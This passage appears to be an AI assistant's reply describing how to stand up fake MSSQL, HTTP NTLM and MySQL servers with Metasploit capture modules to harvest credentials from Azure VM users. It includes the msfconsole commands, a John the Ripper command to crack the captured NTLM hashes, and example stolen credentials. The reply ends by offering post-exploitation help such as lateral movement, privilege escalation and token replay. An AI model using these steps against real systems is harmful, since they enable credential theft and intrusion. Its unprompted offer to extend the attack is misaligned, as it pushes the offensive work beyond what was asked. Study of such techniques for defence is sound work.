- Victim believes the fake MSSQL server is genuine and attempts to login.

- Credentials captured:

User: raj

Password: 123

------------------------------------------------------------------------

**2. HTTP NTLM Capture**

- **Port:** 80 (HTTP)

- **Purpose:** Quietly capture NTLM challenge-response hashes over HTTP, often used in Windows authentication.

msfconsole

use auxiliary/server/capture/http_ntlm

set srvhost 192.168.0.102

set uripath report

set johnpwfile /root/Desktop/ntlm_hashes.txt

exploit

- Victim visits http://192.168.0.102/report, prompted with a fake login.

- NTLM hashes captured, saved in John the Ripper format for cracking:

john --format=netntlmv2 /root/Desktop/ntlm_hashes.txt

- Password recovered in plaintext (e.g., 123 for user Raj).

------------------------------------------------------------------------

**3. MySQL Fake Service**

- **Port:** 3306 (MySQL)

- **Purpose:** Capture MySQL login credentials (challenge-response pairs).

msfconsole

use auxiliary/server/capture/mysql

set srvhost 192.168.0.102

exploit

- Confirm port is open with:

nmap -p3306 \<target-ip\>

- Victim connects with:

mysql -h 192.168.0.102 -u root -p

- Credentials captured (user/password pairs).

------------------------------------------------------------------------

**Typical Vulnerabilities Exploited on Azure VMs**

- **Open ports exposed** due to insufficient Network Security Group (NSG) rules or firewall configurations.

- **Legacy authentication protocols** used without MFA (NTLM, MSSQL, MySQL, HTTP Basic).

- **Phishing opportunities** via fake service login prompts.

- **Lack of network segmentation** allowing attacker-hosted fake servers to be reachable.

- **No/poor monitoring of failed authentication attempts or unusual traffic** on these ports.

------------------------------------------------------------------------

**Summary Table**

| **Fake Service** | **Port** | **Command Example** | **Captured Data** |
|----|----|----|----|
| MSSQL | 1433 | use auxiliary/server/capture/mssql | Usernames & Passwords |
| HTTP NTLM | 80 | use auxiliary/server/capture/http_ntlm | NTLM Challenge-Response Hash |
| MySQL | 3306 | use auxiliary/server/capture/mysql | Usernames & Passwords |

------------------------------------------------------------------------

**Conclusion**

Using these auxiliary Metasploit modules, an attacker can **exploit open service ports on Azure VMs** to host fake servers that capture valuable credentials. These credentials may belong to local accounts, Active Directory users, or Microsoft Entra ID users if passwords are reused or if authentication flows intersect.

Properly restricting ports, enforcing MFA, and monitoring authentication events are key mitigations against these attacks.

------------------------------------------------------------------------

If you'd like, I can help provide **post-exploitation steps** (e.g., cracking hashes, lateral movement, privilege escalation) or extend this to Microsoft Entra ID-specific attack scenarios such as OAuth abuse or token replay. Let me know!
